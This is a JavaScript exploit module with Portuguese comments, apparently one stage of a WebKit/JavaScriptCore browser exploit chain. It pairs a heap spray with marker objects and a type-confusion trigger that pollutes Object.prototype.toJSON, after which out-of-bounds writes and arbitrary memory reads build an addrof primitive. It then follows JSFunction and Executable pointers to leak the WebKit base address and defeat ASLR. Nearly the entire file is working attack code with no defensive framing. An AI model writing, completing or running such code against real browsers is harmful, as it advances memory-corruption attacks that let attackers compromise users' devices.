// js/script3/testArrayBufferVictimCrash.mjs (R45 - addrof via Heap Spray & arb_read - CORRIGIDO)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R45_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R45_SprayAddrofCorrected";

// Parâmetros do Spray
const SPRAY_SIZE = 10000;
const SPRAY_MARKER_BIGINT = 0x4242424241414141n; // Marcador único de 64 bits

// Parâmetros da Varredura de Memória
const SCAN_RANGE_BYTES = 0x400000; // Varredura de 4MB
const SCAN_STEP = 0x8; // Ler a cada 8 bytes

// ** INÍCIO DA CORREÇÃO **
// Parâmetros para o trigger da TC (usado para vazar um ponteiro base para o scan)
const OOB_OFFSET_FOR_TC_TRIGGER = 0x7C;
const OOB_VALUE_FOR_TC_TRIGGER = 0xABABABAB;
// ** FIM DA CORREÇÃO **

// Offsets para WebKit Leak
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

// Nossa nova primitiva de addrof
let addrof_primitive_from_scan = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0x7FF80000 && low === 0x0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R45() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R45_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Heap Spray & arb_read (Corrigido) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init SprayAddrofCorr...`;

    logS3(`--- Fase 0 (SprayAddrofCorr): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);
    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }

    let result = {
        errorOccurred: null,
        addrof_result: { success: false, msg: "Addrof (SprayAddrofCorr): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (SprayAddrofCorr): Não iniciado.", webkit_base_candidate: null },
    };

    try {
        // --- Fase 1: Construir a primitiva ADDROF ---
        logS3(`--- Fase 1 (SprayAddrofCorr): Tentando construir a primitiva ADDROF ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        const target_function_for_addrof = function someUniqueLeakFunctionR45_SprayTarget() {};
        
        logS3(`   Pulverizando a memória com ${SPRAY_SIZE} objetos marcadores...`, "info");
        const spray_array = new Array(SPRAY_SIZE);
        for (let i = 0; i < SPRAY_SIZE; i++) {
            spray_array[i] = {
                marker: SPRAY_MARKER_BIGINT,
                target: target_function_for_addrof // O alvo do addrof é a mesma função para todos
            };
        }
        logS3(`   Spray concluído.`, "good");

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB para varredura.");
        
        // Usar a TC para tentar vazar um ponteiro inicial para a varredura
        logS3(`   Usando TC para tentar vazar um ponteiro base para a varredura...`, "info");
        let scan_base_addr = null;
        let temp_victim_ta = new Uint32Array(16);
        temp_victim_ta.fill(0);
        let temp_m1 = null, temp_m2 = null;
        let temp_probe_calls = 0;
        const temp_probe = () => {
            temp_probe_calls++;
            if (temp_probe_calls === 1) { temp_m2 = {}; temp_m1 = { m2: temp_m2 }; return temp_m1; }
            if (temp_probe_calls === 2) { return temp_m2; }
            return {};
        };
        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            // CORRIGIDO: Usando as constantes agora definidas
            oob_write_absolute(OOB_OFFSET_FOR_TC_TRIGGER, OOB_VALUE_FOR_TC_TRIGGER, 4);
            Object.defineProperty(Object.prototype, ppKey, { value: temp_probe, writable: true, configurable: true, enumerable: false });
            polluted = true;
            JSON.stringify(temp_victim_ta);
            // Após a TC, verificar se o temp_victim_ta foi corrompido com um ponteiro
            for (let i = 0; i < temp_victim_ta.length - 1; i += 2) {
                let p = new AdvancedInt64(temp_victim_ta[i], temp_victim_ta[i+1]);
                if (isValidPointer(p, "_scanBaseFinder")) {
                    scan_base_addr = p;
                    break;
                }
            }
        } finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

        if (!scan_base_addr) {
            throw new Error("Não foi possível obter um endereço base do heap para iniciar a varredura. A TC não vazou um ponteiro no scratchpad.");
        }
        logS3(`   Endereço base para varredura obtido: ${scan_base_addr.toString(true)}`, "good");

        logS3(`   Iniciando varredura de ${SCAN_RANGE_BYTES / 1024} KB em torno do endereço base...`, "info");
        let found_marker_at = null;
        for (let offset = -SCAN_RANGE_BYTES; offset <= SCAN_RANGE_BYTES; offset += SCAN_STEP) {
            const current_scan_addr = scan_base_addr.add(new AdvancedInt64(offset));
            try {
                const val64 = await arb_read(current_scan_addr, 8);
                if (val64 && val64.toBigInt() === SPRAY_MARKER_BIGINT) {
                    found_marker_at = current_scan_addr;
                    logS3(`   !!! MARCADOR ENCONTRADO EM ${found_marker_at.toString(true)} !!!`, "success_major");
                    break;
                }
            } catch (e) { /* ignorar erros de leitura */ }
        }

        if (!found_marker_at) {
            throw new Error("Marcador do spray não encontrado na memória. Tente aumentar SPRAY_SIZE ou SCAN_RANGE_BYTES.");
        }
        
        const target_object_pointer_addr = found_marker_at.add(new AdvancedInt64(8));
        const leaked_target_addr = await arb_read(target_object_pointer_addr, 8);
        if (!isValidPointer(leaked_target_addr, "_leakedFinalAddr")) {
            throw new Error(`Ponteiro lido para o objeto alvo é inválido: ${safeToHex(leaked_target_addr)}`);
        }

        logS3(`   !!! ADDROF(target_function_for_addrof) = ${leaked_target_addr.toString(true)} !!!`, "success_major");
        result.addrof_result = { success: true, msg: "addrof obtido via Heap Spray e arb_read.", leaked_object_addr: leaked_target_addr.toString(true) };
        
        // --- Fase 2: Usar a primitiva ADDROF para vazar a base do WebKit ---
        logS3(`--- Fase 2 (SprayAddrofCorr): Usando addrof para vazar o endereço base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        const addr_of_target_func = leaked_target_addr; // O endereço que acabamos de vazar

        const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
        if (!isValidPointer(ptr_exe, "_wkLeakExeSpray")) throw new Error("Ponteiro para Executable inválido.");
        logS3(`   Ponteiro para Executable Instance = ${ptr_exe.toString(true)}`, "leak_detail");

        const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmSpray")) throw new Error("Ponteiro para JIT Code/VM inválido.");
        logS3(`   Ponteiro para JIT Code/VM = ${ptr_jitvm.toString(true)}`, "leak_detail");

        const webkit_base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
        logS3(`   !!! ENDEREÇO BASE DO WEBKIT (CANDIDATO): ${webkit_base_candidate.toString(true)} !!!`, "success_major");

        result.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: WEBKIT_LEAK_OK!`;

    } catch(e) {
        logS3(`   ERRO na execução do exploit: ${e.message}`, "critical");
        result.errorOccurred = e.message;
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: FAILED`;
    }

    return result;
}
